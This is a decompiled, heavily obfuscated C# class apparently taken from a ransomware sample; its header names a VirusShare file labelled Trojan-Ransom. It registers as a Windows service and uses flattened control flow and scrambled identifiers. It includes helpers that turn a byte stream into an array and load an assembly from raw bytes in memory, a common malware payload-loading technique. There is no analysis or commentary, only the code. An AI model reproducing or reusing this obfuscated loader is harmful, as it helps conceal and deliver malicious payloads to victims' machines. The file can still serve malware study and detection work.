// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႤႥ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Policy;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႤႥ : ServiceBase
  {
    private IContainer Ⴃ;

    public ႤႥ() => this.Ⴃ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static int Ⴄ()
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      return 5;
    }

    protected override void Dispose([In] bool obj0)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_4;
          case 2:
            goto label_5;
          case 3:
          case 5:
            num = this.Ⴃ == null ? 2 : 1;
            continue;
          default:
            num = !obj0 ? 2 : (int) ⴍ[(int) sbyte.MaxValue] - 58;
            continue;
        }
      }
label_4:
      this.Ⴃ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴃ()
    {
      this.Ⴃ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႳႥ.Ⴍ(2076022930, (ႳႥ) null, 8, (Assembly) null), (short) 539, 'ɳ');
    }

    static ႤႥ() => ႳႣ.Ⴅ();

    internal static AppDomain Ⴅ([In] int obj0, [In] short obj1)
    {
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 8;
      IEvidenceFactory evidenceFactory;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            evidenceFactory = (IEvidenceFactory) AppDomain.CurrentDomain;
            num2 = 10;
            continue;
          case 1:
            goto label_3;
          case 2:
            num2 = (int) ⴗ[129] - 6657;
            continue;
          case 4:
          case 6:
            evidenceFactory = (IEvidenceFactory) null;
            num2 = 10;
            continue;
          case 7:
          case 11:
            goto label_12;
          case 8:
            int num3;
            switch ((obj0 ^ (int) obj1) - 36 ^ num1)
            {
              case 0:
                num3 = (int) ⴍ[39] / 5;
                break;
              default:
                num3 = 6;
                break;
            }
            num2 = num3;
            continue;
          case 9:
            num2 = 8;
            continue;
          case 10:
            ++num1;
            num2 = 7488 > 936 - 422 * 8 ? (int) ⴐ[86] - 61 : (int) ⴐ[498] - 164;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႤႥ.Ⴅ);
            num2 = 1;
            continue;
        }
      }
label_12:
      return evidenceFactory as AppDomain;
    }

    internal static byte[] Ⴈ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] int obj2) where \u0021\u00210 : MemoryStream
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = 2;
      Array array;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 11:
            goto label_14;
          case 2:
            int num5;
            switch ((obj2 ^ obj1) - 25 ^ num1)
            {
              case 0:
                num5 = 7;
                break;
              default:
                num5 = 6;
                break;
            }
            num2 = num5;
            continue;
          case 3:
            num2 = (int) ⴐ[121] - 195;
            continue;
          case 4:
            ++num1;
            num3 = 1867;
            int num6 = num3;
            num4 = num6 * num6;
            goto case 10;
          case 6:
            array = (Array) null;
            goto case 8;
          case 7:
            array = (Array) obj0.ToArray();
            num2 = 4;
            continue;
          case 8:
            num2 = 4;
            continue;
          case 9:
            num4 = num3 + num4;
            num2 = num4 % 2 != 0 ? 2 : 11;
            continue;
          case 10:
            num2 = 9;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႤႥ.Ⴈ);
            num2 = (int) ⴐ[103];
            continue;
        }
      }
label_14:
      return array as byte[];
    }

    internal static Assembly Ⴐ<\u0021\u00210>(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] \u0021\u00210 obj2,
      [In] char obj3,
      [In] int obj4)
      where \u0021\u00210 : Evidence
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴍ[19];
      _Assembly assembly;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 9:
            ++num1;
            int num4 = (int) obj3;
            int num5 = num4 * num4;
            num3 = (int) obj3 + num5;
            num2 = 10;
            continue;
          case 1:
            goto label_12;
          case 2:
            assembly = (_Assembly) Assembly.Load(obj0, obj1, (Evidence) obj2);
            num2 = 9;
            continue;
          case 3:
          case 7:
            num2 = 8;
            continue;
          case 4:
          case 5:
            assembly = (_Assembly) null;
            num2 = (int) ⴐ[450];
            continue;
          case 6:
            goto label_3;
          case 8:
            int num6;
            switch (((int) obj3 ^ obj4) - 68 ^ num1)
            {
              case 0:
                num6 = (int) ⴐ[253] - 5;
                break;
              default:
                num6 = 5;
                break;
            }
            num2 = num6;
            continue;
          case 10:
            num2 = num3 % 2 != 0 ? (int) ⴐ[28] - 73 : (int) ⴍ[45];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႤႥ.Ⴐ);
            num2 = (int) ⴗ[85] - 33140;
            continue;
        }
      }
label_12:
      return (Assembly) assembly;
    }
  }
}
